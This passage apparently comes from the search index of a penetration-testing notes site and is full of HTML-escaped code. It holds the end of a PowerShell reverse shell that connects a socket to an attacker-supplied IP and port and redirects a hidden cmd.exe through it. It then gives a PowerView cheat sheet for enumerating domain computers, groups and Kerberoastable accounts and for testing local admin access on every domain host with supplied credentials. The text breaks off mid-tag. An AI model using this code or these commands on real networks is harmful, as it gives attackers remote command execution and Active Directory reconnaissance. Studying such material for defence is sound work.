class=\"no\"\u003eIntPtr\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eInt\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$WSAStartup\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Delegate\u003c/span\u003e \u003cspan class=\"nv\"\u003e$WSAStartupAddr\u003c/span\u003e \u003cspan class=\"vm\"\u003e@\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eInt16], [Byte[]\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eInt\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$Connect\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Delegate\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ConnectAddr\u003c/span\u003e \u003cspan class=\"vm\"\u003e@\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eIntPtr], [Byte[]], [Int\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eInt\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$WSASocket\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eGet-Delegate\u003c/span\u003e \u003cspan class=\"nv\"\u003e$WSASocketAddr\u003c/span\u003e \u003cspan class=\"vm\"\u003e@\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Net.Sockets.AddressFamily], [System.Net.Sockets.SocketType], [System.Net.Sockets.ProtocolType], [IntPtr], [UInt32], [Int\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eIntPtr\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Call WSAStartup to initialize WSA and create a WSA socket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$WSAStartup\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eInvoke\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003e0x202\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Byte[]\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eCreateInstance\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Byte\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003e0x200\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$hSock\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$WSASocket\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eInvoke\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Net.Sockets.AddressFamily\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eInterNetwork\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Net.Sockets.SocketType\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eStream\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Net.Sockets.ProtocolType\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eIP\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eIntPtr\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eZero\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Prepare the sockaddr_in structure in form of a byte array and use it to connect to the target\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eByte[]\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.BitConverter\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eGetBytes\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Convert\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eToUInt32\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eipaddress\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eParse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$IP\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"n\"\u003eAddress\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eByte[]\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"nv\"\u003e$port\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.BitConverter\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eGetBytes\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Convert\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eToUInt16\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$PORT\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eArray\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eReverse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$port\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eByte[]\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"nv\"\u003e$buffer\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003e0x02\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e0x00\u003c/span\u003e \u003cspan class=\"p\"\u003e+\u003c/span\u003e \u003cspan class=\"nv\"\u003e$port\u003c/span\u003e \u003cspan class=\"p\"\u003e+\u003c/span\u003e \u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e \u003cspan class=\"p\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003e0x00\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e0x00\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e0x00\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e0x00\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e0x00\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e0x00\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e0x00\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e0x00\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$Connect\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eInvoke\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$hSock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$buffer\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$buffer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eLength\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Create instances of the STARTUP_INFORMATION and PROCESS_INFORMATION structures\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$startupInformation\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$startupInformationType\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGetConstructors\u003c/span\u003e\u003cspan class=\"p\"\u003e().\u003c/span\u003e\u003cspan class=\"py\"\u003eInvoke\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$processInformation\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$processInformationType\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGetConstructors\u003c/span\u003e\u003cspan class=\"p\"\u003e().\u003c/span\u003e\u003cspan class=\"py\"\u003eInvoke\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Redirect stdin, stdout and stderr to the socket within of STARTUP_INFORMATION\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$safeHandle\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eMicrosoft.Win32.SafeHandles.SafeFileHandle\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$hSock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$startupInformation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003edwFlags\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003e0x00000100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$startupInformation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003ehStdInput\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$safeHandle\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$startupInformation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003ehStdOutput\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$safeHandle\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$startupInformation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003ehStdError\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$safeHandle\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Create a new cmd.exe process with redirected output as specified above\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eSystem.Text.StringBuilder\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;C:\\\\Windows\\\\System32\\\\cmd.exe\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$CreateProcess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eInvoke\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vm\"\u003e@\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$cmd\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e0x08000000\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"no\"\u003eIntPtr\u003c/span\u003e\u003cspan class=\"p\"\u003e]::\u003c/span\u003e\u003cspan class=\"n\"\u003eZero\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$startupInformation\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$processInformation\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e# Finally close the socket handle that is owned by the script\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$CloseSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eInvoke\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$hSock\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Powershell"},{"content":" Tool : https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1 Import-Module ./PowerView.ps1\rGet a list of Computers on the domain Get-NetComputer -Properties samaccountname, samaccounttype, operatingsystem\rGet a list of all groups on a domain Get-NetGroup -Domain internal.msp.local | select name\rGet List of Kerbroastable Users Get-NetUser -Domain msp.local | Where-Object {$_.servicePrincipalName} | select name, samaccountname, serviceprincipalname | Export-CSV -NoTypeInformation kerberoastable.csv\rFind Local Admin Access // Create Credential Object $passwd = ConvertTo-SecureString \u0026#34;password\u0026#34; -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential (\u0026#34;fakedomain\\user\u0026#34;, $passwd) // Gather List of all workstations on domain and store in variable $comps = Get-NetComputer -Domain msp.local -Credential $creds // Attempt to issue a command on each machine - any results indicate local admin on that machine Invoke-Command -ScriptBlock{hostname} -Computer ($comps.dnshostName) -Credential $creds -ErrorAction SilentlyContinue\rList all members of a a given group Get-DomainGroupMember \u0026#34;Domain Admins\u0026#34; -Recurse\r","date":"2023-09-07","id":90,"permalink":"/notes/ad/tools/powerview/","summary":"\u003cul\u003e\n\u003cli\u003eTool :\nhttps://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eImport-Module ./PowerView.ps1\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eGet a list of Computers on the domain\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetComputer\u003c/span\u003e \u003cspan class=\"n\"\u003e-Properties\u003c/span\u003e \u003cspan class=\"n\"\u003esamaccountname\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esamaccounttype\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eoperatingsystem\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eGet a list of all groups on a domain\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetGroup\u003c/span\u003e \u003cspan class=\"n\"\u003e-Domain\u003c/span\u003e \u003cspan class=\"n\"\u003einternal\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003emsp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003elocal\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eselect \u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eGet List of Kerbroastable Users\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetUser\u003c/span\u003e \u003cspan class=\"n\"\u003e-Domain\u003c/span\u003e \u003cspan class=\"n\"\u003emsp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003elocal\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eWhere-Object\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eservicePrincipalName\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eselect \u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esamaccountname\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eserviceprincipalname\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nb\"\u003eExport-CSV\u003c/span\u003e \u003cspan class=\"n\"\u003e-NoTypeInformation\u003c/span\u003e \u003cspan class=\"n\"\u003ekerberoastable\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ecsv\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eFind Local Admin Access\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e//\u003c/span\u003e  \u003cspan class=\"n\"\u003eCreate\u003c/span\u003e \u003cspan class=\"n\"\u003eCredential\u003c/span\u003e \u003cspan class=\"n\"\u003eObject\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$passwd\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eConvertTo-SecureString\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;password\u0026#34;\u003c/span\u003e \u003cspan class=\"n\"\u003e-AsPlainText\u003c/span\u003e \u003cspan class=\"n\"\u003e-Force\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$creds\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eNew-Object\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eManagement\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eAutomation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003ePSCredential\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan 